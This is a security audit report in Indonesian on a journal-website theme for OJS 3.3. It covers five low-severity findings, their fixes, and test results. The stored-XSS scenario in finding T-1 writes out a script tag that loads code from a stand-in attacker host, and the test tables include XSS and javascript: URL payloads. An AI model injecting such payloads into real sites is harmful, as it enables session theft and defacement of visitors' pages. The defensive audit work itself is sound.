# Laporan Audit Keamanan Statis (SAST) — NusantaraReborn 1.0.1.0 untuk OJS 3.3

Developed by Ikhwan Arief (ikhwan[at]unand.ac.id). Copyright (c) 2026 Ikhwan Arief. Dokumentasi: CC BY-NC 4.0.

| Item | Keterangan |
|---|---|
| Objek audit | Theme NusantaraReborn 1.0.1.0 (perbaikan diterapkan di 1.0.2.0, lihat bagian 6), jalur OJS 3.3 (commit `a1f46f9`, repo `ikhwan-arief/NusantaraReborn`) |
| Tanggal audit | 11 November 2026 |
| Metode | Pembacaan kode manual, pencarian sistematis keluaran tanpa escape (`grep` pada `.tpl`/`.php`/`.js`), pembandingan dengan template core OJS 3.3.0-24, serta hasil uji dinamis dari laporan uji (`docs/TEST-REPORT-OJS33.md`) |
| Acuan | OWASP Top 10 (2021), praktik keamanan plugin PKP/OJS 3.3 (escaping Smarty, otorisasi handler, `strip_unsafe_html`) |
| Lingkup | `NusantaraRebornThemePlugin.inc.php`, `index.php`, 11 template `templates/frontend/**/*.tpl`, `js/nusantara.js`, `styles/*.css`, aset SVG/WebP, mekanisme pemuatan aset |
| Di luar lingkup | Core OJS, plugin pihak ketiga, konfigurasi server (TLS, header HTTP), jalur OJS 3.5 (belum ada) |

Nomor baris mengacu pada berkas sumber di repo (`ojs33/nusantaraReborn/…` dan `shared/js/nusantara.js`), bukan berkas di dalam tarball.

---

## 1. Ringkasan eksekutif

Theme ini **tidak menambahkan endpoint, form, handler, query SQL mentah, maupun fungsi unduh berkas** di atas OJS. Seluruh data dibaca melalui API core (`DAORegistry`, `Services`, `Application`, `TemplateManager`), dan seluruh keluaran yang bersumber dari opsi theme di-escape di template atau dibersihkan di PHP. Permukaan serangan yang tersisa adalah (a) HTML pengelola jurnal yang oleh desain OJS memang dirender mentah, dan (b) URL eksternal yang diatur pengelola jurnal.

| Tingkat | Jumlah | Temuan |
|---|---|---|
| High | 0 | — |
| Medium | 0 | — |
| Low | 3 | T-1 HTML pengelola jurnal dirender mentah (setara core); T-2 publikasi tanggal keputusan editorial; T-3 URL eksternal yang diatur pengelola jurnal |
| Info | 2 | T-4 Google Fonts tanpa SRI (opsional, bukan bawaan); T-5 `innerHTML` pada elemen terlepas di JS |

Kategori yang diperiksa dan **tidak ditemukan** kerentanan: XSS melalui opsi theme, meta tag, JSON-LD, atribut `href`/`src`; SQL Injection; IDOR/bypass otorisasi berkas; kebocoran naskah belum terbit; CSRF; path traversal; pemuatan skrip pihak ketiga.

Rekomendasi: T-1 dan T-3 dapat diperketat pada rilis 1.0.2.0 (perubahan kecil, kompatibel). T-2 disarankan dipertahankan karena merupakan kebutuhan jurnal (DOAJ/SINTA), dengan opsi penyembunyian jika diinginkan.

---

## 2. Skor dan definisi tingkat keparahan

| Tingkat | Definisi yang dipakai |
|---|---|
| High | Dapat dieksploitasi pengunjung anonim atau penulis, berdampak pada integritas/kerahasiaan sistem |
| Medium | Memerlukan peran rendah (penulis/reviewer) atau menambah risiko di atas perilaku core OJS |
| Low | Memerlukan peran Journal Manager/administrator, atau dampaknya terbatas pada privasi/konfigurasi; tidak melampaui perilaku core |
| Info | Catatan praktik baik tanpa jalur eksploitasi yang nyata |

---

## 3. Temuan

### T-1 — HTML pengelola jurnal dirender tanpa penyaringan (Low)

**Lokasi**

| Berkas | Baris | Variabel |
|---|---|---|
| `templates/frontend/pages/editorialTeam.tpl` | 18 | `{$nrEditorialBody}` |
| `templates/frontend/pages/navigationMenuItemViewContent.tpl` | 31 | `{$content}` |
| `templates/frontend/objects/article_details.tpl` | 242, 246 | `{$ccLicenseBadge}`, `{$currentContext->getLocalizedData('licenseTerms')}` |
| `templates/frontend/components/footer.tpl` | 24, 32, 92 | `{$sidebarCode}`, `{$pageFooter}` |
| `templates/frontend/pages/indexJournal.tpl` | 204 | `{$additionalHomeContent}` |

**Deskripsi**
Variabel di atas berisi HTML yang ditulis pengelola jurnal (Journal Manager, JM) melalui editor TinyMCE di Settings > Journal > Masthead, Settings > Website > Navigation (Custom Page), Settings > Website > Appearance (footer, additional content), serta Distribution > Permissions (license terms). Theme merendernya apa adanya.

**Perbandingan dengan core**
Template core OJS 3.3.0-24 merender variabel yang sama secara mentah: `lib/pkp/templates/frontend/pages/editorialTeam.tpl` baris 20, `lib/pkp/templates/frontend/pages/navigationMenuItemViewContent.tpl`, `templates/frontend/objects/article_details.tpl` (license terms), dan `lib/pkp/templates/frontend/components/footer.tpl` (`$pageFooter`). OJS memperlakukan konten JM sebagai HTML tepercaya. Theme **tidak menambah** permukaan serangan.

**Skenario eksploitasi**
Akun JM yang disusupi (phishing, kata sandi lemah) atau JM yang berniat jahat menyisipkan `<script src="https://attacker.example/x.js"></script>` ke isi Dewan Redaksi. Skrip berjalan untuk setiap pengunjung halaman (stored XSS): pencurian sesi pengguna yang login, defacement, atau penyisipan tautan spam. Prasyaratnya adalah peran JM, yang di OJS sudah berhak mengubah seluruh tampilan jurnal; dampaknya sama dengan menggunakan Default Theme.

**Mitigasi yang sudah ada**
- Pengantar dewan redaksi (`$nrEditorialIntro`, baris 17) sudah disaring dengan `|strip_unsafe_html`.
- Deskripsi jurnal, abstrak, dan deskripsi terbitan memakai `|strip_unsafe_html` atau `|escape`.
- Tidak ada input dari peran lebih rendah (penulis, reviewer, pembaca) yang masuk ke jalur ini.

**Rekomendasi**
Pengetatan opsional di atas standar core: saring konten JM dengan `strip_unsafe_html`, yang memakai daftar tag/atribut `allowed_html` dari `config.inc.php`.

```smarty
{* editorialTeam.tpl, baris 18 *}
<div class="nr_masthead">{$nrEditorialBody|strip_unsafe_html}</div>

{* navigationMenuItemViewContent.tpl, baris 31 *}
{$content|strip_unsafe_html}

{* article_details.tpl, baris 246 *}
{$currentContext->getLocalizedData('licenseTerms')|strip_unsafe_html}
```

Dampak samping yang harus diputuskan pemilik produk: `strip_unsafe_html` membuang `<iframe>`, `<script>`, `<object>`, dan atribut `on*`. Jurnal yang menyematkan video, peta, atau badge pengindeks berbasis skrip di halaman kebijakan akan kehilangan elemen tersebut. `{$ccLicenseBadge}`, `{$sidebarCode}`, dan `{$pageFooter}` disarankan tetap mentah: badge dibuat core dari daftar lisensi tetap, dan dua lainnya adalah keluaran plugin blok/footer yang bertanggung jawab atas escaping-nya sendiri.

---

### T-2 — Publikasi tanggal keputusan editorial (Low, information disclosure)

**Lokasi**
`NusantaraRebornThemePlugin.inc.php` baris 538–560, metode `editorialDates()`; pembacaan `EditDecisionDAO::getEditorDecisions()` di baris 548. Ditampilkan oleh `article_details.tpl` baris 43–50.

**Deskripsi**
Theme membaca tabel `edit_decisions` untuk menampilkan tanggal *Dikirim*, *Direvisi*, *Diterima*, dan *Terbit* di halaman artikel. Data ini berasal dari alur editorial yang secara bawaan tidak ditampilkan OJS ke publik.

**Skenario eksploitasi**
Pengunjung dapat menyimpulkan lamanya proses telaah tiap artikel. Tidak ada jalur eskalasi; ini murni pengungkapan informasi. Tanggal tersebut lazim dicantumkan jurnal Indonesia dan diminta oleh beberapa pengindeks.

**Mitigasi yang sudah ada**
- Hanya dipanggil bila `publication.status === STATUS_PUBLISHED` (baris 521 `nrDates`), sehingga pratinjau naskah belum terbit tidak memicu pembacaan.
- Hanya kolom `decision` dan `date_decided` yang dipakai; `editor_id`, `review_round_id`, `stage_id`, dan keputusan tolak tidak pernah keluar.
- Tidak ada komentar reviewer, nama editor, atau file tahap telaah yang diakses.

**Rekomendasi**
Pertahankan, tetapi beri kendali pada JM:

```php
// init(): tambah opsi
$this->addOption('showEditorialDates', 'FieldOptions', [
    'type' => 'radio',
    'label' => __('plugins.themes.nusantaraReborn.option.showEditorialDates.label'),
    'options' => [
        ['value' => 'show', 'label' => __('plugins.themes.nusantaraReborn.option.show')],
        ['value' => 'hide', 'label' => __('plugins.themes.nusantaraReborn.option.hide')],
    ],
    'default' => 'show',
]);

// buildArticleData(): hormati opsi
'nrDates' => ($isPublished && $this->getOption('showEditorialDates') !== 'hide')
    ? $this->editorialDates($article, $publication)
    : [],
```

---

### T-3 — URL eksternal yang diatur pengelola jurnal (Low)

**Lokasi**
`NusantaraRebornThemePlugin.inc.php` baris 1151–1159, metode `safeUrl()`. Dipakai untuk `publisherUrl`, `editorInChiefPhoto` (baris 341), `socialWebsite/Instagram/Youtube/Linkedin/X`, `termsUrl`, dan tautan `indexedIn`. Dirender antara lain di `indexJournal.tpl` baris 185 (`<img class="nr_editor_photo" src="{$nrEditorInChiefPhoto|escape}" …>`) dan `footer.tpl`.

**Deskripsi**
JM dapat memasukkan URL mana pun. `safeUrl()` menerima hanya URL absolut dengan skema `http` atau `https` (`filter_var(FILTER_VALIDATE_URL)` + pemeriksaan `parse_url(PHP_URL_SCHEME)`), sehingga `javascript:`, `data:`, `vbscript:`, dan URL relatif dibuang. Uji dinamis dengan `javascript:alert(1)` pada `publisherUrl` memastikan nilai tidak pernah dirender.

**Skenario eksploitasi**
1. **Pelacakan pengunjung:** foto Editor-in-Chief dari domain pihak ketiga membuat browser setiap pengunjung mengirim permintaan (alamat IP, `Referer`) ke domain itu.
2. **Mixed content:** URL `http://` pada situs HTTPS memicu peringatan browser dan gambar diblokir.
3. **Open redirect semu:** tautan media sosial diarahkan ke situs phishing. Prasyarat tetap peran JM, yang memang berwenang mengatur tautan jurnal.

**Rekomendasi**
Batasi URL gambar ke HTTPS dan hilangkan `Referer`:

```php
// safeUrl() dengan daftar skema opsional
protected function safeUrl($value, $schemes = ['http', 'https'])
{
    $value = trim((string) $value);
    if ($value === '' || !filter_var($value, FILTER_VALIDATE_URL)) {
        return '';
    }
    $scheme = strtolower((string) parse_url($value, PHP_URL_SCHEME));
    return in_array($scheme, $schemes, true) ? $value : '';
}

// assignTemplateVariables(): foto hanya https
'nrEditorInChiefPhoto' => $this->safeUrl($this->getOption('editorInChiefPhoto'), ['https']),
```

```smarty
{* indexJournal.tpl, baris 185 *}
<img class="nr_editor_photo" src="{$nrEditorInChiefPhoto|escape}" alt="{$nrEditorInChiefName|escape}" loading="lazy" referrerpolicy="no-referrer">
```

Untuk tautan keluar di footer, `rel="noopener"` sudah dipasang; dapat ditambah `noreferrer` bila kebijakan privasi jurnal menghendaki.

---

### T-4 — Google Fonts tanpa Subresource Integrity (Info)

**Lokasi**
`NusantaraRebornThemePlugin.inc.php` baris 1213–1218, `googleFontsUrl()`; pemuatan di `init()` hanya bila `fontSource === 'google'`; `preconnect` di `addHeadHints()` baris 843–846.

**Deskripsi**
Saat JM memilih mode Google Fonts, theme memuat stylesheet dari `fonts.googleapis.com` tanpa atribut `integrity`.

**Analisis**
SRI tidak dapat diterapkan pada Google Fonts: layanan itu menyajikan CSS berbeda per User-Agent, sehingga hash tidak stabil. Mitigasi yang sudah ada:
- Bawaan adalah `system`; pemantauan jaringan pada uji dinamis memastikan nol permintaan eksternal dari theme pada mode ini (satu-satunya permintaan eksternal adalah badge lisensi CC yang dihasilkan core).
- URL dibangun dari daftar keluarga font tetap di PHP, bukan dari input JM.
- Theme tidak memuat skrip pihak ketiga sama sekali; jQuery, jQuery UI, Popper, dan Bootstrap dropdown berasal dari Default Theme core (`lib/pkp/lib/vendor` lokal).

**Rekomendasi**
Dokumentasikan dalam panduan bahwa mode Google Fonts mengirim permintaan ke Google (sudah tertulis di `docs/PANDUAN-PENGATURAN.md`). Jika institusi melarang CDN, pasang CSP di server, misalnya `style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com`, atau tetap pada mode sistem.

---

### T-5 — `innerHTML` pada elemen terlepas di JavaScript (Info)

**Lokasi**
`shared/js/nusantara.js` baris 316–318, fungsi `parseEntry()` di `enhanceEditorialTeam()`; `innerHTML` ikon statis di baris 255 dan 275.

**Deskripsi**
Untuk mengubah daftar dewan redaksi menjadi kartu, skrip meng-clone tiap `<li>`, membagi `innerHTML`-nya pada `<br>`, lalu menulis potongan ke `div` terlepas untuk mengambil `textContent`.

**Analisis**
Sumber datanya adalah DOM yang sudah dirender core (lihat T-1); skrip tidak membaca URL, query string, `location.hash`, atau `postMessage`. Semua hasil parsing ditulis kembali melalui `escapeHtml()` atau `textContent`; tautan asli di-clone sebagai node, bukan string. String yang dimasukkan dengan `innerHTML` di baris 255/275 adalah konstanta kelas ikon. Tidak ada eskalasi di atas T-1.

**Rekomendasi**
Tidak perlu tindakan. Jika T-1 diperketat dengan `strip_unsafe_html`, jalur ini otomatis ikut bersih. Alternatif lebih ketat: gunakan `DOMParser` dengan `text/html` pada elemen terlepas, yang menjamin skrip/`onerror` tidak dieksekusi.

---

## 4. Pemeriksaan yang tidak menghasilkan temuan

### 4.1 Cross-Site Scripting (OWASP A03)

| Jalur | Hasil pemeriksaan |
|---|---|
| Opsi theme teks (tagline, hero, penerbit, label, sorotan, bio, nama editor, `indexedIn`) | Semua dirender dengan `|escape`; `indexedIn` dibersihkan `cleanText()` (strip tag + batas 80 karakter). Uji dinamis `<script>alert(1)</script> "quoted" & Ünïcode` tampil sebagai teks ter-escape |
| Meta tag (`og:*`, `description`, `canonical`, `theme-color`, preload) | Dibangun dengan `html()` = `htmlspecialchars(ENT_QUOTES, UTF-8)` (baris 1143–1146) |
| JSON-LD (`addJsonLd`, baris 968–977) dan peta negara (`editorialTeam.tpl` baris 19, `nofilter`) | `json_encode` dengan `JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT`; urutan `</script>` tidak dapat keluar dari blok |
| Atribut `href`/`src` dinamis | `$homeUrl`, `$nrCardUrl`, `$nrIssueUrl` dari `{url}` core; `$doiUrl` di-assign dengan `|escape` (article_details.tpl baris 59); logo memakai `|escape:"url"` seperti core |
| Pernyataan hak cipta | `{translate|escape key="submission.copyrightStatement" …}` (article_details.tpl baris 237), mengikuti perbaikan OJS 3.3.0-24 |
| Tautan bagikan (`twitter`, `facebook`, `linkedin`, `mailto`) | Parameter memakai `|escape:"url"` |
| `tel:` di footer | `regex_replace` non-digit lalu `|escape` |
| Blok panduan `FieldHTML` (baris 196–209) | Berisi string lokal statis dan angka hasil `count()`; tidak ada input pengguna |
| `<title>` | Nama jurnal di-escape (headerHead.tpl), lebih ketat daripada core |

### 4.2 SQL Injection (OWASP A03)

Tidak ada `retrieve()`, `execute()`, `DB::raw`, atau string SQL. Akses data memakai `DAORegistry::getDAO('EditDecisionDAO')->getEditorDecisions($id)`, `IssueDAO::getById()`, `SectionDAO::getById()`, `SubmissionKeywordDAO::getKeywords()`, `NavigationMenuDAO::getByArea()`, `NavigationMenuItemAssignmentDAO::getByMenuId()`, dan `Services::get('submission')->getMany([...])` dengan parameter bertipe (`(int)`, array konstanta). Semua parameter berasal dari objek yang sudah dimuat core, bukan dari request mentah.

### 4.3 Broken Access Control / IDOR (OWASP A01)

| Area | Hasil |
|---|---|
| Unduh/lihat galley | Theme hanya membentuk URL dengan `{url page="article" op="download" …}`; pemeriksaan hak akses tetap di `ArticleHandler` core |
| `galleyFileSize()` (baris 603–626) | Menerima objek dari `$primaryGalleys` yang sudah diotorisasi `ArticleHandler::view()`; hanya membaca ukuran, tidak mengirim isi berkas; semua pengecualian ditangkap |
| Kartu artikel dan artikel terkait (`relatedArticles`, baris 563–600) | Filter `status => [STATUS_PUBLISHED]`, cek `publication.status`, dan `issue->getPublished()`; uji dinamis dengan naskah antrean `[UNPUBLISHED]` memastikan tidak muncul di beranda, artikel terkait, maupun JSON-LD |
| JSON-LD artikel (baris 1019–1100) | Hanya bila `publication.status === STATUS_PUBLISHED` dan bukan tampilan versi/galley |
| Arsip (`buildArchiveData`) | `$issues` berasal dari `IssueHandler::archive()`; penghitungan artikel difilter `STATUS_PUBLISHED` |
| Opsi antarjurnal | `ThemePlugin::getOption()` core membaca per `contextId`; uji dua jurnal memastikan tidak ada kebocoran opsi |
| Halaman tingkat situs | `assignPageData()` dan `addSeoMetadata()` keluar lebih awal bila `$context` null; `primaryMenuItemCount()` mengembalikan `null` tanpa konteks |

### 4.4 CSRF dan endpoint (OWASP A01/A05)

Theme tidak mendaftarkan handler, operasi, form, atau route API. Penyimpanan opsi sepenuhnya melalui `PKPThemeForm` core yang dilindungi token CSRF OJS.

### 4.5 Path traversal dan berkas

Tidak ada `include`/`require` dinamis, `file_get_contents`, atau operasi berkas selain `galleyFileSize()` via `Services::get('file')`. Aset dimuat dengan `addStyle()`/`addScript()` dari path tetap relatif ke plugin.

### 4.6 Komponen pihak ketiga (OWASP A06)

Paket tidak membundel pustaka. Daftar isi tarball: 2 PHP, 11 TPL, 2 CSS, 1 JS, 2 PO, 1 XML, 15 SVG, 10 WebP, dokumen. SVG dihasilkan skrip sendiri tanpa `<script>` atau referensi eksternal.

### 4.7 Pengemasan dan rahasia (OWASP A05)

`scripts/build.sh` menyalin berdasarkan daftar putih, menolak berkas tersembunyi/symlink, dan memeriksa identitas lama. Kredensial stack uji (`.env`, `credentials.txt`) ada di `.gitignore`; pemindaian terhadap kata sandi, token, email pribadi, dan path lokal dilakukan sebelum setiap push.

---

## 5. Uji dinamis pendukung

Dirangkum dari `docs/TEST-REPORT-OJS33.md` (OJS 3.3.0-24, PHP 8.2.35, MariaDB 10.11, Chrome 157):

| Uji | Hasil |
|---|---|
| Opsi berisi `<script>alert(1)</script>`, kutip, `&`, Unicode | Tampil sebagai teks; tidak ada eksekusi |
| `publisherUrl` dan `indexedIn` berisi `javascript:` | Dibuang; tidak pernah dirender |
| Naskah antrean berjudul `[UNPUBLISHED]` | Tidak muncul di halaman publik mana pun |
| Pemantauan permintaan jaringan, mode font sistem | Tidak ada permintaan ke domain eksternal dari theme |
| Mode Google Fonts | Hanya `fonts.googleapis.com` dan `fonts.gstatic.com` |
| Konsol browser | Nol error pada 5 preset × 3 lebar layar |

---

## 6. Status perbaikan (rilis 1.0.2.0)

| Temuan | Status | Implementasi | Verifikasi dinamis |
|---|---|---|---|
| T-1 | **Diperbaiki, dengan penyesuaian** | `richHtml()` di `NusantaraRebornThemePlugin.inc.php`: HTMLPurifier bawaan OJS, daftar putih = `allowed_html` server + `h2–h6`, tabel, `blockquote`, `hr`, `span`, `div`; skema URL `http/https/mailto/tel`. Dipakai untuk Dewan Redaksi (`nrEditorialBody`), Custom Page (`nrPageContent`), dan license terms (`nrLicenseTerms`) | `<script>`, `onerror`, `javascript:`, `style`, `<iframe>` dibuang; tidak ada dialog `alert` di browser; kartu dewan redaksi, daftar isi kebijakan, tabel, dan kutipan tetap utuh |
| T-2 | Diperbaiki | Opsi `showEditorialDates` (bawaan: tampil) | Opsi *Sembunyikan* menghilangkan baris tanggal; informasi artikel lain tetap ada |
| T-3 | Diperbaiki | `safeUrl($value, $schemes)`; foto Editor-in-Chief hanya `https` + `referrerpolicy="no-referrer"` | URL `http://` diabaikan (kartu memakai ikon); URL `https://` dirender dengan `referrerpolicy` |
| T-4 | Didokumentasikan | Panduan pengaturan menjelaskan permintaan ke Google dan saran CSP | — |
| T-5 | Tidak perlu tindakan | Sumbernya kini sudah disaring T-1 | — |

**Penyesuaian T-1.** Rekomendasi awal (`|strip_unsafe_html`) diuji dan **ditolak** karena menimbulkan regresi: `allowed_html` bawaan OJS 3.3 tidak memuat heading, tabel, maupun `blockquote`, sehingga kartu dewan redaksi dan daftar isi halaman kebijakan tidak terbentuk. Theme kini memakai instance HTMLPurifier sendiri dengan daftar putih yang memperluas `allowed_html`. Konsekuensi: video/widget berbasis `<iframe>` atau `<script>` tidak dapat disematkan di ketiga jenis konten tersebut (sudah dijelaskan di panduan pengaturan).

## 7. Rencana tindak lanjut (sebelum perbaikan)

| Temuan | Tindakan | Prioritas | Catatan |
|---|---|---|---|
| T-1 | Terapkan `strip_unsafe_html` pada masthead, custom page, license terms | Opsional | Perlu persetujuan pemilik produk karena membuang `<iframe>`/`<script>` yang mungkin dipakai jurnal |
| T-2 | Tambah opsi `showEditorialDates` | Rendah | Bawaan tetap tampil |
| T-3 | `safeUrl()` dengan daftar skema; HTTPS-only + `referrerpolicy="no-referrer"` untuk foto | Rendah | Kompatibel mundur |
| T-4 | Dokumentasi CSP untuk mode Google Fonts | Info | Sudah tertulis di panduan pengaturan |
| T-5 | Tidak ada | — | Ikut selesai bila T-1 diterapkan |

Audit ini bersifat statis dan terarah pada kode theme; bukan penetration test terhadap instalasi OJS tertentu, dan tidak menilai konfigurasi server. Ulangi audit bila ada perubahan pada template, pembacaan data, atau pemuatan aset, dan sebelum rilis jalur OJS 3.5.
